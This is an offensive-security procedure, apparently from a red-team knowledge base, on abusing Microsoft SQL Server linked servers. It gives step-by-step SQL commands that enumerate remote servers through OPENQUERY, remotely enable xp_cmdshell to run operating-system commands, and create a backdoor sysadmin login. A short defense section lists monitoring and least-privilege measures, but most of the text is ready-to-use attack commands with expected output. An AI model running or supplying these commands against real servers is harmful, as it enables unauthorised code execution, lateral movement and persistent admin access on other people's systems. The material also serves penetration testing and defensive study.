---
type: procedure
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - >-
    [[techniques/Exploitation-of-Remote-Services|T1210 - Exploitation of Remote
    Services]]
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/Create-Account|T1136 - Create Account]]'
sub_techniques: []
tags:
  - '[[tags/execute-query-through-link]]'
  - '[[tags/linked-database]]'
  - '[[tags/mssql-server]]'
commands:
  - '[[commands/execute-openquery-to-retrieve-server-info]]'
  - '[[commands/enable-xp-cmdshell-and-execute-shell-via-linked-server]]'
  - '[[commands/create-sysadmin-login-via-linked-server]]'
platforms:
  - Windows
tools: []
verified: true
validated: true
---

# Execute-Queries-via-Linked-SQL-Servers

## Summary

This procedure demonstrates how to leverage linked servers in Microsoft SQL Server to execute queries, run shell commands, and create administrative accounts on remote servers. It enables lateral movement and privilege escalation by chaining SQL operations across database instances, allowing attackers with access to one SQL server to compromise linked remote systems.

## Description

Linked servers in SQL Server allow one instance to connect to and execute queries against another database server via OLE DB providers. This feature, intended for legitimate data integration, can be abused for offensive purposes such as enumerating remote server information, enabling extended stored procedures like xp_cmdshell to run OS commands, and creating backdoor accounts. The technique requires authenticated access to the source SQL instance with permissions to use OPENQUERY or EXECUTE...AT constructs. It is particularly effective in Active Directory environments where SQL servers are domain-joined, facilitating network propagation. Potential outcomes include remote code execution, data exfiltration, and persistent access via new admin logins.

## Requirements

1. Authenticated session to a SQL Server instance with db_owner or sysadmin privileges on the source server.
2. Existence of a pre-configured linked server with valid credentials or pass-through authentication to the target.
3. Knowledge of the linked server name and target server details (e.g., domain-qualified names like DOMINIO\SERVER1).
4. SQL Server Management Studio (SSMS) or sqlcmd for execution; assumes Windows environment with MSSQL.

## Defense

- Restrict linked server configurations to deny EXECUTE permissions and disable pass-through authentication where possible.
- Monitor SQL Server logs for anomalous OPENQUERY or EXECUTE...AT usage, especially chained queries or xp_cmdshell invocations.
- Implement principle of least privilege: Avoid granting sysadmin to linked server logins and regularly audit linked server setups.
- Enable SQL Server Audit for extended procedures and use tools like SQL Server Profiler to detect suspicious query patterns.

## Objectives

1. Enumerate and retrieve information from remote servers via linked connections.
2. Achieve remote code execution by enabling and using xp_cmdshell through the link.
3. Establish persistence by creating a new sysadmin login on the remote server.

## Instructions

### Step 1: Retrieve Server Information via OPENQUERY

**Context**: Begin by using the OPENQUERY function to execute pass-through queries on the linked server, allowing enumeration of system details like linked servers or version information. This step verifies connectivity and gathers reconnaissance without alerting basic defenses. Why: It confirms the linked server is operational and provides insights into the remote environment before escalating.

**Command** ([[commands/execute-openquery-to-retrieve-server-info]]):
```sql
SELECT * FROM OPENQUERY("$_LINKED_SERVER", 'SELECT * FROM master..sysservers');
SELECT @@version FROM OPENQUERY("$_LINKED_SERVER", 'SELECT @@version AS version');

-- Chain multiple OPENQUERY for deeper traversal
SELECT @@version FROM OPENQUERY("$_LINKED_SERVER_1", 'SELECT @@version FROM OPENQUERY("$_LINKED_SERVER_2", "SELECT @@version AS version")');
```

> This command executes SELECT statements directly on the remote server via the linked connection. Replace $_LINKED_SERVER with the actual linked server name (e.g., dcorp-sql1). The first query lists linked servers on the target; the second retrieves the SQL version. Chaining allows querying further linked servers. Expected output includes a result set with server names, statuses, and version strings like "Microsoft SQL Server 2019 (RTM) - 15.0.2000.5". If no rows return, check linked server permissions.

### Step 2: Enable xp_cmdshell and Execute Shell Commands

**Context**: Enable the xp_cmdshell extended stored procedure on the remote server to run OS-level commands, enabling lateral execution of shell actions like directory listing. This bypasses direct remote access by tunneling commands through SQL. Why: xp_cmdshell provides a gateway to the underlying Windows OS, allowing post-exploitation without additional tools.

**Command** ([[commands/enable-xp-cmdshell-and-execute-shell-via-linked-server]]):
```sql
EXECUTE('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT $_LINKED_SERVER;
SELECT 1 FROM OPENQUERY("$_LINKED_SERVER", 'SELECT 1; EXEC master..xp_cmdshell "$_SHELL_COMMAND"');
```

> First, the EXECUTE...AT enables xp_cmdshell remotely if disabled. Then, OPENQUERY runs a shell command like "dir c:". Replace $_LINKED_SERVER (e.g., linkedserver) and $_SHELL_COMMAND with the desired OS command. Expected output: For dir, a table with file listings from C:\, such as columns for Mode, LastWriteTime, and Length. Success confirms RCE; failure may indicate insufficient privileges or xp_cmdshell already disabled.

### Step 3: Create Sysadmin Login via Linked Server

**Context**: Use nested EXECUTE statements to create a new login on the remote server and add it to the sysadmin role, establishing a persistent backdoor account. This allows future direct logins without relying on the linked server. Why: It provides long-term access even if the initial compromised server is hardened.

**Command** ([[commands/create-sysadmin-login-via-linked-server]]):
```sql
EXECUTE('EXECUTE(''CREATE LOGIN $_USERNAME WITH PASSWORD = ''''$_PASSWORD'''' '') AT "$_TARGET_SERVER"') AT "$_LINKED_SERVER";
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''$_USERNAME'''' , ''''sysadmin'''' '') AT "$_TARGET_SERVER"') AT "$_LINKED_SERVER";
```

> This nests EXECUTE to run CREATE LOGIN and sp_addsrvrolemember on the target via the linked server. Replace $_USERNAME (e.g., hacker), $_PASSWORD (e.g., P@ssword123.), $_TARGET_SERVER (e.g., DOMINIO\SERVER1), and $_LINKED_SERVER (e.g., DOMINIO\SERVER2). Expected output: No rows affected or success messages like "The server principal 'hacker' has been created" and role membership confirmation. Verify by logging in with the new credentials; errors indicate permission issues.
